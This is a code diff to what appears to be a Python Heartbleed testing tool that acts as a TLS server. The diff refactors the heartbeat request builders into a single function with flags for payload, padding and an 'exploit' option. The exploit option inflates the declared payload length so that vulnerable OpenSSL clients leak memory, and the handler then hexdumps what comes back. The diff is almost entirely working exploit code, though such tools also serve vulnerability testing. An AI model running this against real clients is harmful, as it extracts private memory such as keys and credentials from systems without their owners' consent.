@@ -70,6 +70,12 @@ parser.add_argument('--skip-server', default=False, action='store_true',
 parser.add_argument('-g', '--good-request', default=False, action='store_true',
         dest='good_heart',
         help='Send a good, well formed Heartbeat request')
+parser.add_argument('-a', '--no-payload', default=False, action='store_true',
+        dest='no_payload',
+        help='Leave the payload empty')
+parser.add_argument('-d', '--add-padding', default=False, action='store_true',
+        dest='add_padding',
+        help='Add padding to Heartbeat request')
 parser.add_argument('-x', '--count', type=int, default=1,
         help='Number of Heartbeats requests to be sent (default %(default)d)')
 parser.add_argument('-n', '--payload-length', type=payload_len, default=0xffed,
@@ -99,6 +105,7 @@ def make_hello(sslver, cipher):
     data += ' 01'    # mode
     return bytearray.fromhex(data.replace('\n', ''))
 
+# we don't care about this one, leaving for the legacy code
 def make_heartbeat(sslver, payload_len=0xffed):
     data = '18 ' + sslver
     data += ' 00 03'    # Length
@@ -111,24 +118,22 @@ def make_heartbeat(sslver, payload_len=0xffed):
     data += ' {0:02x} {1:02x}'.format(payload_len >> 8, payload_len & 0xFF)
     return bytearray.fromhex(data.replace('\n', ''))
 
-def make_good_heartbeat(sslver, payload_len=12):
-    payload_len = 12
-    data = '18 ' + sslver
-    data += ' 00 1F'    # Length [3 (type + 2-byte length) + 12 (payload) + 16 (padding)]
-    data += ' 01'       # Type: Request
-    data += ' {0:02x} {1:02x}'.format(payload_len >> 8, payload_len & 0xFF)
-    data += ' 62 61 6E 61 6E 61 76 65 67 67 69 65' # payload
-    data += ' 78 70 61 64 64 69 6E 67 70 61 64 64 69 6E 67 78' # pad
-    return bytearray.fromhex(data.replace('\n', ''))
+def build_heartbeat(sslver, add_payload=True, add_padding=True, add_exploit=True):
+    payload_len = (12 if add_payload else 0)
+    padding_len = (16 if add_padding else 0)
+    data = '18 ' + sslver  # 0x18 (24) is the content type for Heartbeat extension
+    # type (1 byte) + heartbeat length (2 bytes) = 3
+    record_len = 3 + payload_len + padding_len
 
-def make_sick_heartbeat(sslver, payload_len=12):
-    payload_len = 12*2 # lie
-    data = '18 ' + sslver
-    data += ' 00 1F'    # Length [3 (type + 2-byte length) + 12 (payload) + 16 (padding)]
+    data += ' {0:02x} {1:02x}'.format(record_len >> 8, record_len & 0xFF)
     data += ' 01'       # Type: Request
+    if add_exploit:
+        payload_len += 12
     data += ' {0:02x} {1:02x}'.format(payload_len >> 8, payload_len & 0xFF)
-    data += ' 62 61 6E 61 6E 61 76 65 67 67 69 65' # payload
-    data += ' 78 70 61 64 64 69 6E 67 70 61 64 64 69 6E 67 78' #pad
+    if add_payload:
+        data += ' 62 61 6E 61 6E 61 76 65 67 67 69 65'
+    if add_padding:
+        data += ' 78 70 61 64 64 69 6E 67 70 61 64 64 69 6E 67 78'
     return bytearray.fromhex(data.replace('\n', ''))
 
 def hexdump(data):
@@ -292,12 +297,10 @@ class RequestHandler(socketserver.BaseRequestHandler):
 
             for i in range(0, self.args.count):
                 try:
-                    if self.args.good_heart:
-                        if not self.do_good():
-                            break
-                    else:
-                        if not self.do_evil():
-                            break
+                    if not self.send_heartbeat(not self.args.no_payload,
+                            self.args.add_padding,
+                            not self.args.good_heart):
+                        break
                 except socket.error as e:
                     if i == 0: # First heartbeat?
                         print('Unable to send first heartbeat! ' + str(e))
@@ -346,30 +349,10 @@ class RequestHandler(socketserver.BaseRequestHandler):
 
         # (skip Certificate, etc.)
 
-    def do_evil(self):
+    def send_heartbeat(self, do_payload, do_padding, do_exploit):
         '''Returns True if memory *may* be acquired'''
         # (2) HeartbeatRequest
-        self.request.sendall(make_sick_heartbeat(self.sslver, self.args.payload_len))
-
-        # (3) Buggy OpenSSL will throw 0xffff bytes, fixed ones stay silent
-        memory = read_hb_response(self.request, self.args.timeout)
-
-        # If memory is None, then it is not vulnerable for sure. Otherwise, if
-        # empty, then it *may* be invulnerable
-        if memory is not None and not memory:
-            print("Possibly not vulnerable")
-            return False
-        elif memory:
-            print('Client returned {0} ({0:#x}) bytes'.format(len(memory)))
-            hexdump(memory)
-
-        return True
-
-    def do_good(self):
-        '''Returns True if memory *may* be acquired'''
-        print("> Sending good heartbeat request...")
-        # (2) HeartbeatRequest
-        self.request.sendall(make_good_heartbeat(self.sslver, self.args.payload_len))
+        self.request.sendall(build_heartbeat(self.sslver, do_payload, do_padding, do_exploit))
 
         # (3) Buggy OpenSSL will throw 0xffff bytes, fixed ones stay silent
         memory = read_hb_response(self.request, self.args.timeout)
